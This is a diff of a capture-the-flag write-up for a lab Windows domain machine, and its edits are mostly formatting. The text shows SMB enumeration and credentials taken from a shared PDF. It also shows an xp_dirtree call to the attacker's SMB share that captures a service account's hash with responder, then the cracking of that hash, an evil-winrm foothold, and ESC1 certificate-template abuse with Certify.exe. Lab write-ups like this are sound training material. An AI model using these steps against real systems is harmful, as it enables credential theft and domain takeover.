@@ -69,40 +69,53 @@ Host script results:
 |_    Message signing enabled and required
 ```
 
-We got the domain name of the machine, `sequel.htb` which we'll be adding to our `/etc/hosts` file. 
+We got the domain name of the machine, `sequel.htb` which we'll be adding to our `/etc/hosts` file.
+
 ![Editing hosts file](Images/domain_name.png)
+
 We can also see a `smb` share on port 139 & 445, `winrm` service on port 5985, `Microsoft SQL Server` on port 1433 and `Active Directory` services. 
 
 
 # Enumerating SMB Shares
-Now, we can start enumerating services. We'll use `smbmap` to enumerate `smb` service. 
+Now, we can start enumerating services. We'll use `smbmap` to enumerate `smb` service.
+
 ![SMB Shares](Images/smbmap.png)
+
 We have two **READ ONLY** shares called *Public* and *IPC$*. Whenever *IPC\$* is readable, we can use `impacket-lookupsid` to get a list of usernames in the system. 
+
 ![List of usernames](Images/impacket-lookupsid.png)
 
 Names that has **SidTypeUser** as a label is the usernames that's in the system. After enumerating usernames by using *IPC$*, we also need to enumerate *Public* share that's readable by anonymous users.
+
 ![Anonymous SMB Share](Images/smbclient_anonymous_login.png)
 
-We'll download the *PDF* file to see the contents inside since we can't open it on `smb` server. 
+We'll download the *PDF* file to see the contents inside since we can't open it on `smb` server.
+
 ![Credentials in PDF](Images/creds_from_pdf.png)
+
 So, they've provided username and passwords for `mssql` and it looks like the account doesn't have much privileges considering it's for new hired employees.
 
 
 # Exploiting MSSQL
 We can use `impacket-mssqlclient` to authenticate `mssql` server with the credentials provided by the *PDF* file.
+
 ![Authenticating MSSQL as PublicUser](Images/impacket-mssqlclient.png)
 
-[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) has an article for pentesting and enumerating `mssql` servers. After checking the permissions to see who can run the `mssql` functions, we can see that `xp_dirtree` can be called by the public, basically everyone who's logged in.  
-![Misconfigured Permissions](Images/xp_dirtree-permission.png)`xp_dirtree` is **an undocumented and unsupported command** that returns a hierarchical directory listing of the specified path in the file system. We can use it to access a `smb` server hosted by us to get the hash of the user running the service. In order to host a `smb` share on our machine, we can use either `responder` or `impacket-smbserver`. We'll be using `responder` here - 
+[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) has an article for pentesting and enumerating `mssql` servers. After checking the permissions to see who can run the `mssql` functions, we can see that `xp_dirtree` can be called by the public, basically everyone who's logged in.
+
+![Misconfigured Permissions](Images/xp_dirtree-permission.png)
+
+`xp_dirtree` is **an undocumented and unsupported command** that returns a hierarchical directory listing of the specified path in the file system. We can use it to access a `smb` server hosted by us to get the hash of the user running the service. In order to host a `smb` share on our machine, we can use either `responder` or `impacket-smbserver`. We'll be using `responder` here - 
 ```bash
 sudo responder -I tun0 -v
 ```
 
 By running `xp_dirtree '\\my-ip\anything'` on the `mssqlclient` , we'll get the hash of the user _sql_svc_ on your `responder` console like this -
 
-![](Images/sql_svc-hash.png)
+![Responder capturing sql_svc hash](Images/sql_svc-hash.png)
 
 Since we got the hash, we can save it to a file and crack it with `JohnTheRipper`. The hash is saved in the sql_svc_hash file - 
+
 ![Cracking sql_svc hash](Images/hash-crack.png)
 
 
@@ -112,11 +125,13 @@ Now, we have both the username and password so we could try to authenticate a se
 ![Getting foothold with evil-winrm](Images/foothold.png)
 
 After browsing through the directories, we've found an interesting file in the directory `C:\SQLServer\Logs`. It looks like user _Ryan.Cooper_ has tried to login `mssql` with their passwords instead of their username. 
+
 ![Credentials of Ryan.Cooper](Images/log-file.png)
 
 We will use them as username and password for repectively `evil-winrm` since we can see that there's a user called _Ryan.Cooper_ in the system.
 
 ![Getting foothold as Ryan.Cooper](Images/userflag.png)
+
 We've successfully got the shell as the user that has a flag. We can see the user flag in `C:\Users\Ryan.Cooper\Desktop`.
 
 
@@ -135,6 +150,7 @@ Invoke-adPEAS   # Enumerate everything related to the AD
 ```
 
 ![Vulnerable Template found by adPEAS](Images/UserAuthentication-enumerate.png)
+
 As we can see here, permissions for template **UserAuthentication** is set to **GenericAll** which means every domain user can request a ticket using that template. So, our goal here would be to request a ticket of _Administrator_ and then use it to authenticate as _Administrator_. This misconfigured certificate template is often noted as **ESC1** 
 
 
@@ -195,6 +211,7 @@ With `Certify.exe`, we can find vulnerable certificate services by simply runnin
 ./Certify.exe find /vulnerable
 ```
 and here's the output -
+
 ![Enumerating with Certify.exe](Images/certify-find.png)
 
 We can request a certificate as _Administrator_ by using `request` command - 
